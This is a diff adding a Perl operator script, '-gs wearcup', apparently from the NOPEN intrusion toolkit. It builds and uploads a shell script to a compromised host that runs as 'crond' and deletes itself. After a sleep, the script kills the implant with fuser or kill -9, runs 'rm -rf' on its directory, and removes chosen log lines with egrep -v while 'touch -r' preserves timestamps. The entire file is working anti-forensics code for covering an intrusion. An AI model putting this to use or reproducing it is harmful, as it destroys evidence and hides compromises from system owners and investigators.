@@ -1,0 +1,693 @@
+#!/usr/bin/env perl
+##
+$VER="2.3.0.2" ;
+# nopen seems happier with stderr in lsh runs
+# or does it? Took it out now...
+#select STDERR ;
+$| = 1 ;
+myinit() ;
+$dowhat = buildit() ;
+
+my %badplace = () ;
+my @badplaces = ("/tmp","/","/usr","/var","/bin","/sbin","/proc",
+		 "/home","/etc","/dev","/boot","/lib","/opt","/var/tmp",
+		 "/usr/var","/var/usr","/root","/export","/lost+found",
+		);
+my @regexps = ("(/[^\/]+)*/\.[a-f0-9]{15}[a-f0-9]*\$",
+	      );
+$badplace{$_}++ foreach (@badplaces) ;
+if (!$skipwipe) {
+  my ($problem,$hiddenproblem) = (0,0);
+  my $out = "";
+  if ($badplace{$targetcwd}) {
+    $problem++;
+  }
+  foreach $regexp ( @regexps) {
+    $hiddenproblem++ if ($targetcwd =~ /$regexp/);
+  }
+  if ($problem) {
+    unlink("$opup/cup.auto") ;
+    my $count = 0 ;
+    $out .= "Why?  Directory to wipe must not be any of these:\n    ";
+    foreach (@badplaces) {
+      $out .= sprintf("%-12s",$_) ;
+      $count++ ;
+      $out .= "\n    " unless ($count % 5) ;
+    }
+  }
+  if ($hiddenproblem) {
+    $out .= "\nWhy?  Directory to wipe must not match any of these (perl) regular expressions:\n    ";
+    foreach (@regexps) {
+      $out .= sprintf("%-35s",$_) ;
+      $count++ ;
+      $out .= "\n    " unless ($count % 3) ;
+    }
+  }
+  if ($problem or $hiddenproblem) {
+    $dowhat =~ s,(/bin/rm -rf $targetcwd),###BADLINE:\1,;
+    $dowhat =~ s,($fuserfile -k.*$targetcwd),###BADLINE:$1, ;
+    mymydie(			#"Directory to wipe must not be any of these:\n    $out \n\n".
+	  ".\n\n".
+	  "\n\n".
+	  "\t\tFATAL ERROR!!!! ABORTING BEFORE DOING ANYTHING.\n\n".
+	  "\t\t$opup/cup.auto would have contained the\n".
+	  "\t\tBAD LINES marked and commented out below:\n\n".
+	  $dowhat."\n\n\n".
+	  "$out\n\n".
+	  "Use -W to skip the dir wipe entirely, with -T to indicate any\n".
+	  "binaries you want to kill with fuser and then wipe.\n\n".
+	  "Or, use -W to skip the dir wipe with -p (and maybe -P) to kill\n".
+	  "the NOPEN pid(s) (and perhaps other pids).\n"
+	 ) ;
+  }
+}
+$prompt .= "$COLOR_FAILURE\n\n".
+  "$prog has called autowearcup. Its execution will continue\n".
+  "once your cup script is active.\n\n"
+  if ($autodone);
+$prompt .= "${COLOR_NOTE}## $opup/cup.auto has been built and contains:\n".
+  $COLOR_NORMAL.
+  "\n$dowhat\n\n";
+if (!$debug) {
+  $prompt .= "<A>bort or <C>ontinue with upload and execute $opup/cup.auto as $name?";
+  if (($ans) = mygetinput($prompt,"A","C")) {
+    dbg("runonce=$runonce= autodone=$autodone=");
+    my $more = "\n\n".
+      "WARNING: Neither cup nor autonewdone has been properly executed yet.\n".
+      "         Be sure you either run -gs auto manually here or get another window on\n".
+      "         $nopen_rhostname so that window can do so.\n\n"
+      if ($autodone);
+    mymydie("Aborting$more") if ($ans eq "a") ;
+  }
+  progprint("\n\nUploading and executing $opup/cup.auto as \"$name &\"\n",$COLOR_FAILURE);
+  ($output) = doit("-put $opup/cup.auto $targetcwd/$name",
+                   "-cat $targetcwd/$name",
+                   "-cd $targetcwd",
+                  );
+  `mkdir -p $opdown/$nopen_rhostname/NOSEND/tools`;
+  copy("$opup/cup.auto",
+       "$opdown/$nopen_rhostname/NOSEND/tools/cup_deployed_".timestamp(short)) or
+	   copy("$opup/cup.auto",
+		"$opdown/NOSEND/cup.${nopen_rhostname}_deployed_".timestamp(short));
+  newhostvar("host_donotburn{$nopen_rhostname}","$prog $output");
+  ($output,$nopenlines,@output) =
+    doit("PATH=.:\$PATH $name &",
+	 "-cdp",
+	);
+  $cuppidactual = $output[0];
+  ($output,$nopenlines,@output) = 
+    doit(
+	 "=ps | egrep \"$name|sleep $sleep\" | grep -v grep",
+	 NONOHIST
+	);
+  #TODO: Clean up...parse output above to generate pastables
+  my ($sleeppid,$cuppid,%sleeppid,$matchcount,$bettersleeppid,$warning) = ();
+  foreach (@output) {
+    my ($pid,$ppid) = /(\d+)\s+(\d+)/;
+    if (/sleep $sleep/) {
+      $sleeppid{$ppid} = $pid;
+    }
+    if (/$name/) {
+      $cuppid{$pid} = 1;
+      $cuppidparent{$pid} = $ppid;
+    }
+  }
+  if (scalar keys %sleeppid > 1) {
+    $warning = "$COLOR_FAILURE\a".
+      "BE CAREFUL!! There seems to be more than one \"sleep $sleep\".\n".
+      "             We should have found the right one but check it.\n".
+      "             ps output was:\n\n".
+      "=ps | egrep \"$name|sleep $sleep\" | grep -v grep\n$output";
+  }
+  foreach $pid (keys %cuppid) {
+    next unless $pid == $cuppidactual;
+    if ($cuppidparent{$pid} == 1 and
+	$sleeppid{$pid} > 1) {
+      $sleeppid = $sleeppid{$pid};
+      $bettersleeppid = $sleeppid{$pid} if $sleeppid{$pid} == $cuppidactual;
+      $cuppid = $pid;
+      last;
+    }
+  }
+  mymydie("Could not find both pids: sleeppid=$sleeppid cuppid=$cuppid\n\n\aYOU MUST MANUALLY FIGURE IT OUT FROM HERE (which to kill to do what).")
+    unless ($sleeppid and $cuppid);
+  my $alarmdelay = secstostr(maxof(10,$sleep-600));
+  my ($killcontent) = 
+    ("$COLOR_NORMAL\n".
+     "\n\n".
+     secstostr($sleep)." CUP script deployed at ".scalar gmtime().".\n\n".
+     "Issue this to kill sleep, making the Clean UP process begin\n".
+     "( This is$COLOR_FAILURE INSTEAD OF -burn$COLOR_NORMAL ):\n\n\t\t".
+     "kill -9 $sleeppid\n\n".
+     "Or issue this to kill off and abort cup process entirely\n".
+     "($COLOR_FAILURE CleanUP is then up to you$COLOR_NORMAL ):\n\n\t\t".
+     "kill -9 $cuppid ; sleep 1 ; kill -9 $sleeppid\n\n".
+     $warning."\n\n".
+     "A pop-up alarm will be given in $alarmdelay."
+    );
+  progprint($killcontent);
+  if (open(OUT,">>$opdown/$nopen_rhostname.cup.sleep.pids")) {
+    print OUT "$sleeppid,$cuppid\n";
+    close(OUT);
+  } else {
+    mywarn("Could not write to $opdown/$nopen_rhostname.cup.sleep.pids");
+  }
+  $dowhat =~ s/\n/\n     /g;
+  if (open(OUT,">>$opdown/$nopen_rhostname.cup.sleep.kills")) {
+    print OUT "$COLOR_NOTE".scalar gmtime().
+      " -gs wearcup [$$] cup script deployed:$COLOR_NORMAL \n     ".
+      $dowhat.
+      $killcontent;
+    close(OUT);
+    popalarm("$opdown/$nopen_rhostname.cup.sleep.kills",$alarmdelay);
+  } else {
+    mymydie("Could not write to $opdown/$nopen_rhostname.cup.sleep.pids");
+  }
+  sleep 6 if $warning;
+} else {
+  my  $commands .= "\n\nDEBUG: Here is the\n".
+    "$opup/cup.auto that $prog would have uploaded/executed if\n".
+      "debug mode was not chosen:\n\n$COLOR_NORMAL".
+	"$dowhat\n\n";
+  progprint("$commands",$COLOR_FAILURE);
+}
+ENDMAIN:
+
+# Called via do so must end with 1;
+1;
+
+sub mymydie {
+    mywarn(@_);
+    goto ENDMAIN
+}
+#mymydie 
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs wearcup @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }  
+    require $autoutils;
+    $prog = "-gs wearcup";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  $defsleep = "10800" ;
+  $defname = "crond" ;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $origparms = " @ARGV";
+#  mydie("bad option(s)") if (! Getopts( "hvw:d:DHr:ACP:F:pL:WbtR" ) ) ;
+  mydie("bad option(s)") if (! Getopts( "hvw:d:DHr:ACP:F:pL:WtRT:" ) ) ;
+  $debug = $opt_D ;
+  mydie("Syntax error: $prog takes only options no arguments")
+    if (@ARGV);
+  if ($opt_r) {
+    $name = $opt_r ;
+  } else {
+    $name = $defname ;
+  }
+  $fusertargetfiles = $opt_T;
+  $resetfuser = $opt_R;
+  $noburn = $opt_b;
+  $notouch = !$opt_t;
+  mydie("-r argument \"$name\" must not contain a \"/\".")
+    if ($name =~ /\//) ;
+  $cupfile = "$opup/cup.auto" ;
+my $nah_not_anymore =
+  " -b           Clean log entries now (implies -C and -w0), but do NOT
+              burn the RAT via fuser and do NOT clean up the directory.
+" ;
+  my $defhrs = $defsleep/60/60 ;
+  $gsusagetext="
+Usage: $prog [-h | options]
+
+OPTIONS [defaults]
+
+-w delay     Have the script sleep for this long before firing. (\"delay\"
+             can be in the format: [#h][#m]#[s])                   [${defhrs}h]
+-p           Instead of using fuser to kill, just outright \"kill -9\"
+             this NOPEN server's pid and (if not 1) its parent pid.
+             This can be useful if you have no working directory any
+             longer and the NOEPN binary is already deleted, but there
+             is still something you want done AFTER NOPEN is gone (with
+             -C or -A, or both).
+-P pidlist   When using -p, also kill -9 these pids. List must be
+             comma delimited integers greater than one.
+             NOTE:  Use care here, obviously.
+-d /dir      Use this directory as the one to wipe and/or the one
+             running binaries that need killing.            [NOPEN cwd]
+-W           Skip the dir wipe (\"rm -rf /dir\") step.
+-D           Debug mode--build cup.auto but just show it and exit.
+-r rmtname   Run ${name} on target as \"name\".                         [$defname]
+-C           Clean some log entries from one or more files. You are
+             prompted for the file to clean, and the regexp to egrep -v
+             out of it. This works on Solaris 2.6+ syslogd files and
+             most any Linux, too.
+-t           Used with -C, this uses the \"touch -r\" command to try to
+             preserve the timestamp of the file(s) being cleaned.
+             Probably this is not needed--the timestamp is probably
+             roughly current, anyway. Note that this will leave a
+             current ctime, though.
+-A           Run some more commands after cleanup (use -C for egrep -v
+             style log cleaning, though). You are prompted for the
+             commands to run.
+-T file(s)   File names (comma delimited) of binaries in /dir to kill
+             with fuser (may be needed when -W is used, if the process
+             being killed is in a directory we do not want to wipe).
+-F file(s)   Full path to target's \"fuser\" program. Without -F,
+             $prog will verify the usual location will work. Can
+             be a comma delimited list of several files to try.
+-R           Reset--remove previously set/verified fuser and find it
+             again.
+
+NOTE about -C/-A: Keep in mind no one will see any output from these
+                  commands as they are done after the RAT is killed.
+
+$prog builds $opup/cup.auto according to the chosen
+options, shows the final result, then allows user to either abort or
+continue and upload/run cup.auto on target as \"./rmtname \&\".
+
+cup.auto will be patterned after the original shell script cup. Cup
+stands for \"Clean UP\" and is most often run on HP, since a running
+binary cannot be deleted there.
+
+When run, ${name} will delete itself and then sleep the desired delay. Once
+the sleep expires or is killed, ${name} then uses either fuser or kill -9
+to kill the desired processes, and then wipes the desired files and/or
+directories.
+
+$prog can be run at the beginning of an op. Default sleep time is
+three hours. When the op is done, DO NOT BURN NOPEN! Instead, send the
+sleep's pid (NOT CUP's pid and NOT NOPEN's pid) a \"kill -9\". This will
+trigger the rest of the commands in the uploaded cup script to execute,
+namely killing off the NOPEN server and its children and cleaning and
+deleting the directory.
+$COLOR_FAILURE
+AGAIN: DO NOT BURN NOPEN WITH -burn WHEN CUP IS REQUIRED TO DELETE
+       THE NOPEN BINARY RUNNING.
+$COLOR_NORMAL
+
+";
+  usage() if ($opt_h or $opt_v) ;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+  mydie("-t makes no sense without -C")
+    if ($opt_t and !$opt_C);
+  mydie("-b and -p or -F make no sense together")
+    if ($opt_b and ($opt_F or $opt_p));
+  mydie("-p and -F make no sense together")
+    if ($opt_p and $opt_F);
+  mydie("-P requires -p")
+    if ($opt_P and !$opt_p);
+  if ($opt_W) {
+    mydie("-W makes no sense with -d")
+      if ($opt_d);
+#    mydie("-W requires -T")
+#      unless($opt_T);
+  }
+  mydie("-d argument must start with \"/\"")
+    if ($opt_d and !($opt_d =~ /^\//)) ;
+  mydie("Directory \"$opt_d\" must not contain whitespace")
+    if ($opt_d =~ /\s/) ;
+  mydie("-T argument must not be a path, just a filename (no \"/\")")
+    if ($opt_T =~ /\//);
+  my ($amt,$what,$junk) = $opt_w =~ /^(\d+)(.{0,1})(.*)/ ;
+  # $opt_w  is "\d+[hs]" time to sleep in minutes ('m' or no unit), seconds or hours
+  if ($opt_w) {
+    $sleep = strtoseconds($opt_w);
+    mydie("-w argument ($opt_w) not in the form [#h][#m]#[s]")
+      if ($sleep < 0);
+  } else {
+    $sleep = $defsleep;
+  }
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+   $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid) = parsestatus("force");
+  ($killpid,@fuserfiles) = ();
+  $fuserfile = whatfuser();
+  @fuserfiles =($fuserfile) if $fuserfile;
+  unless ($noburn) {
+    # $opt_F optional non-standard $fuserfile
+    my $nosuchfile=1;
+    my $baduserfile=0;
+    if ($opt_F) {
+      mydie("malformed -F argument $opt_F")
+	if (!($opt_F =~ /^\/\S+$/) or $opt_F =~ /\"/) ;
+      if ($fuserfile and $opt_F ne $fuserfile) {
+	mywarn("You provided \"$opt_F\" as the fuserfile, but target seems to\n\t".
+	       "have $fuserfile. Either continue with your choice, or abort and\n\t".
+	       "then re-try WITHOUT -F.",$COLOR_FAILURE);
+	my $ans = getinput("Continue or Abort?","A","C");
+	mydie("Aborted by user.") if ($ans =~ /^a/i);
+	$fuserfile = $opt_F;
+	$fuserfile =~ s/,/ /g;
+	($output,$nopenlines,@output) = doit("-sha1sum $fuserfile");
+	my %tested = ();
+	foreach (@output) {
+	  ($file) = (/\d\d:\d\d:\d\d \d{4} (\/.*)/);
+	  ($file,$junk) = ($1,$2) if
+	    $file =~ /(\S+)(\s+\[.*\])/;
+	  next unless $file;
+	  next if $tested{$file}++;
+	  $nosuchfile=0;
+	  ($output) = doit("$file");
+	  push(@fuserfiles,$file) if ($output =~ /usage.*fuser/i) ;
+	}
+      }
+      if (!@fuserfiles) {
+	mydie("No such file $fuserfile on $nopen_rhostname")
+	  if $nosuchfile;
+	my ($ans) = mygetinput("$fuserfile does not appear to really be fuser. The output\n".
+			   "of \"$fuserfile\" above should contain \"usage.*fuser\" and does not.\n".
+			   "USE THIS FILE ($fuserfile) AT YOUR OWN RISK/PERIL!!!!\n\n\a".
+			   "Either Continue and we will use it, or Abort and retry without -F.\n\t".
+			   "Continue or Abort?","A","C");
+	mydie("Aborted by user.") if ($ans eq "a");
+	$baduserfile++;
+	push(@fuserfiles,$fuserfile);
+      }
+    } else {
+      if ($opt_p) {
+	$killpid = " $targetpid" if ($targetpid > 1);
+	$killpid .= " $targetppid" if ($targetppid > 1);
+	if ($opt_P) {
+	  foreach $tmp (split(/,/,$opt_P)) {
+	    mydie("-P must be comma delimited integers greater than 1")
+	      unless ($tmp =~ /^\d+$/ and $tmp > 1);
+	    $killpid .= " $tmp";
+	  }
+	}
+      }
+    }
+    unless (@fuserfiles) {
+      ($output,$nopenlines,@output) = doit("-sha1sum /usr/bin/fuser /bin/fuser /usr/sbin/fuser /sbin/fuser");
+      foreach (@output) {
+	($file) = (/\d\d:\d\d:\d\d \d{4} (\/.*)/);
+	($file,$junk) = ($1,$2) if
+	  $file =~ /(\S+)(\s+\[.*\])/;
+	next unless $file;
+	next if $tested{$file}++;
+	($output) = doit("$file");
+	push(@fuserfiles,$file) if ($output =~ /usage/i) ;
+      }
+    }
+    if (@fuserfiles == 1) {
+      $fuserfile = shift(@fuserfiles);
+    } elsif (@fuserfiles > 1) {
+      my $output = "" ;
+      my $warning = "";
+      my $s="";
+      $s = "s" if @fuserfiles > 2;
+      my $singular = $s ? "" : "s" ;
+      my $default = 1;
+      if ($baduserfile) {
+	$warning = "$COLOR_FAILURE".
+	  "WARNING: You supplied $fuserfiles[0], which did not look like fuser. The other\n".
+	    "         file$s listed here appear$singular to be a better choice.\n".
+	      "$COLOR_NORMAL\n";
+	$default = 2;
+      }
+      my @allowed = ($default) ;
+      for (my $i = 1 ; $i <= @fuserfiles ; $i++) {
+	push(@allowed,$i);
+	$output .= "\t$i) $fuserfiles[$i-1]\n";
+      }
+      $output .= "\tA) Abort\n";
+
+      my ($ltr,$ans) = mygetinput("${warning}More than one fuser file found (scroll up to see -sha1sums):\n".
+				  "$output\nUse which one (or Abort):",@allowed,"A") ;
+      mydie("Aborted by user.") if ($ans eq "a");
+      $fuserfile = @fuserfiles[$ans-1] ;
+    } else {
+      mydie("No fuser found on target. Either use -F to point to one,\n".
+	    "\t\tor -p to use kill -9 method instead of fuser.");
+    }
+    whatfuser($fuserfile);
+  }#$noburn or find fuser
+  unless ($noburn or $killpid) {
+    mydie("Could not find /usr/sbin/fuser.\n".
+	  " Use -F if you know where it is. ABORTING!")
+      unless ($fuserfile);
+    # TODO: Save off this $fuserfile for future use on this guy
+  }
+  # $opt_d is working DIR to wipe clean
+  $skipwipe=0;
+  $targetcwd = $opt_d if $opt_d;
+  $skipwipe++ if ($opt_W);
+  ($output) = doit("-ls -d $targetcwd");
+  mydie("-d $targetcwd must exist")
+    unless ($output =~ /^(.)\S{9}\s*.*\d\d:\d\d(:\d\d){0,1} \d{4} (\/.*)$/
+	   and $targetcwd eq $3);
+  mydie("-d $targetcwd must be a directory")
+    unless ($1 eq "d");
+  $wipetargets = "";
+  if ($fusertargetfiles) {
+    my %doneit = ();
+    foreach $file (split(/,/,$fusertargetfiles)) {
+      next if $doneit{$file}++;
+      ($output) = doit("-ls $targetcwd/$file");
+      mydie("FATAL ERROR: $targetcwd/$file does not exist")
+	unless $output;
+      $wipetargets .= " $targetcwd/$file";
+    }
+  }
+
+  # Make sure that our remote name is not present on target.
+  ($remotelist,$nopenlines,@remotelist) = doit("du $targetcwd/$name");
+  if ($remotelist =~ /(\d+)\s+$targetcwd\/$name/) {
+    mydie("$targetcwd/$name already exists on target with size $1; use a different name with -r!");
+  }
+
+  $nonohist = $opt_H ;
+  @runafter = () ;
+  my $checkfilesizes = "" ;
+  if ($opt_C) {
+    # Frist, before cleaning, and after the killing, we sleep a few
+    # to give whatever we just killed a chance to finish logging.
+    @runafter2 = ("/bin/sleep 5");
+    my $file = "" ;
+    my $regexp = "" ;
+    my $randfile = "/tmp/.t.$$" ;
+    my $randfile2 = "$randfile.2";
+    $randfile2 = "" if $notouch;
+    mywarn("Choose files to clean after bailing.${COLOR_WARN}\n\nBE CAREFUL!!\n\nMake sure the files/regexp's you enter here are 100% accurate
+and do not hurt the target and do what you want. There's no way to check the result.\n\n") ;
+    while ($file ne "DONE") {
+      ($ltr,$file) = mygetinput("File to clean:","DONE");
+      last if ($file eq "DONE");
+      unless ($file =~ /^\//) {
+	mywarn("File must be full pathname.");
+	next;
+      }
+      ($ltr,$regexp) = mygetinput("Regexp matching lines to delete:");
+      unless($file and $regexp) {
+	mywarn("Ignoring file \"$file\" and regexp \"$regexp\", since one is empty.");
+	next;
+      }
+      push(@runafter2,"/bin/touch -r $file $randfile2")
+	unless $notouch;
+      push(@runafter2,"/bin/egrep -v \"$regexp\" $file > $randfile ; /bin/cat $randfile > $file");
+      push(@runafter2,"/bin/touch -r $randfile2 $file")
+	unless $notouch;
+      $checkfilesizes .= " $file" ;
+    }
+    if (@runafter2) {
+      push(@runafter2,"/bin/rm -f $randfile $randfile2");
+    }
+    if ($checkfilesizes) {
+      # This is only time there is a second pass
+      ($output,$nopenlines,@output) = doit("-ls $checkfilesizes");
+      my %size = ();
+      foreach(@output) {
+	my @fields = split(/\s+/,$_);
+	if (@fields == 10 and $fields[9] =~ /^\// and $fields[4] =~ /^\d+$/) {
+	  $size{$fields[9]} = $fields[4];
+	}
+      }
+      ($output,$nopenlines,@output) = doit("=df /tmp");
+      my ($availfield,$capfield,$kavailable) = ();
+      foreach(@output) {
+	my @fields = split(/\s+/,$_);
+	if (/filesystem.*avail.*mount/i) {
+	  for ($i=0;$i<@fields;$i++) {
+	    $availfield = $i if ($fields[$i] =~ /avail/i) ;
+	    $capfield = $i if ($fields[$i] =~ /capacity/i) ;
+	  }
+	}
+	if ($availfield) {
+	  $kavailable = $fields[$availfield];
+	  $available = 0.90*( 1024 * $fields[$availfield]);
+	}
+      }
+      mydie("Unable to find space available on /tmp: $available") unless $available;
+      my $s = "s" if ((scalar(keys %size)) > 1) ;
+      mywarn("Checking that /tmp has sufficient space (${kavailable}K) for the file$s being cleaned");
+      foreach $file (keys %size) {
+	$ksize{$file} = $size{$file}/1024;
+	if ($size{$file} > $available) {
+	  mydie("ABORTING: $file is $ksize{$file}K and /tmp has only ${kavailable}K available");
+	}
+	mywarn(sprintf(" %8.2fK size %-35s${COLOR_NOTE} OK",$ksize{$file},$file));
+      }
+    }#if $checkfilesizes
+  }#if $opt_C
+  if ($opt_A) { # skip this section until second pass if there is one
+    mywarn("\n\nBE CAREFUL!!\n\nMake sure the commands you enter here are 100% accurate
+and do not hurt the target and do what you want. There's no way to check.\n\n");
+
+    $ans = "dummy";
+    while ($ans) {
+      my $more = "";
+      $more = "Enter the other (-A) commands you want to run on target,\n".
+	"one per line. Blank line terminates.\n\n"
+	  if ($ans eq "dummy");
+      ($ltr,$ans) = 
+	mygetinput($more.
+		   "next line> ","");
+      push(@runafter,$ans) if $ans ;
+    }
+  }#if $opt_A
+  if ($killpid and !$opt_d) {
+    my $s = "s" if ($killpid =~ / /);
+    mywarn("Killing pid$s $killpid. NO DIRECTORY WILL BE WIPED.\n\t\t".
+	   "Use -d /dir to wipe a directory also.");
+  }
+  if ($noburn) {
+    my $more = "\n\t\t(and you entered nothing for -A/C)"
+      if $opt_A or $opt_C;
+    mydie("-b makes no sense without either -A or -C or both$more")
+      unless (@runafter or $checkfilesizes);
+  }
+}#myinit
+sub buildit {
+  mydie("Unable to open > $cupfile") unless
+    open(CUPOUT,"> $cupfile") ;
+  my $commands = doit("#!/bin/sh",CUPOUT);
+  $commands .= doit("echo \$\$",
+		    "/bin/rm -f $targetcwd/$name",
+		    "cd /",
+		    "trap : TERM",
+		    "exec >&- 2>&-",
+		    "sleep $sleep",
+		    CUPOUT);
+  if ($killpid) {
+    $commands .= doit("/bin/kill -9 $killpid",
+		      CUPOUT);
+    $commands .= doit("/bin/sleep 5",
+		      "/bin/rm -rf $targetcwd",
+		      CUPOUT)
+      if ($targetcwd and !$skipwipe);
+  } else {
+    my $targetcwdalso="";
+    $targetcwdalso = "$targetcwd/"
+      unless ($targetcwd eq "/tmp" or $skipwipe);
+    if ($fusertargetfiles) {
+      my @fusertargets = split(/,/,$fusertargetfiles);
+      if (@fusertargets) {
+	my %doneit = ();
+	$fusertargetfiles = "";
+	foreach (@fusertargets) {
+	  $fusertargetfiles .= "$targetcwd/$_ "
+	    unless $doneit{$_}++;
+	}
+      }
+    } else {
+      $fusertargetfiles = "$targetcwd/*"
+	unless ($targetcwd eq "/tmp");
+    }
+    if ($targetcwdalso or $fusertargetfiles) {
+      $commands .= doit(
+			"$fuserfile -k $targetcwdalso $fusertargetfiles",
+			CUPOUT) unless $noburn;
+    }
+    $commands .= doit("/bin/sleep 5",
+		      "/bin/rm -rf $targetcwd",
+		      CUPOUT) unless $skipwipe;
+  }#$killpid or not
+  $commands .= doit("/bin/rm -f $wipetargets",
+		    CUPOUT)
+    if ($wipetargets);
+  if (@runafter2) {
+    $commands .= doit(@runafter2,CUPOUT);
+  }
+  if (@runafter) {
+    $commands .= doit(@runafter,CUPOUT);
+  }
+  close(CUPOUT) ;
+  return $commands ;
+}#buildit
+
+sub getinput {
+  local($prompt,$default,@allowed) = @_;
+  local($ans,$tmp,%other) = ();
+  $other{"Y"} = "N" ; $other{"N"} = "Y" ;
+  if ($other{$default} and ! (@allowed)) {
+    push(@allowed,$other{$default}) ;
+  }
+  $tmp = $default;
+  if (chop($tmp) eq "") {
+    #damn ^M's in script files
+    $default = $tmp;
+  }
+  SUB: while (1) {
+    print STDERR $prompt;
+    if ($default) {
+      print STDERR " [$default] ";
+    } else {
+      print STDERR " ";
+    }
+    chomp($ans = <STDIN>);
+    $ans = $default if ( $ans eq "" );
+    last SUB if ($#allowed < 0) ;
+    foreach ($default,@allowed) {
+      last SUB if $ans =~ /^$_/i ;
+    }
+  }
+  return $ans;
+}#getinput
+
+sub whatfuser {
+  local ($setfuserfile) = (@_);
+  if ($setfuserfile) {
+    mymydie("Cannot open $optmp/fuserfile.$nopen_rhostname for write")
+      unless open(OUT,"> $optmp/fuserfile.$nopen_rhostname");
+    print OUT "$setfuserfile";
+    close(OUT);
+  } else {
+    if ($resetfuser) {
+      unlink("$optmp/fuserfile.$nopen_rhostname");
+      $resetfuser=0;
+    } else {
+      return ""
+	unless open(IN,"$optmp/fuserfile.$nopen_rhostname");
+      chomp($setuserfile = <IN>);
+      close(IN);
+      progprint(" \n\nfuser file set to $setuserfile in previous run of $prog\n".
+		"Use -R option to no longer use it.\n",$COLOR_FAILURE)
+	if $setuserfile;
+      sleep 2;
+    }
+  }
+  return $setuserfile;
+}
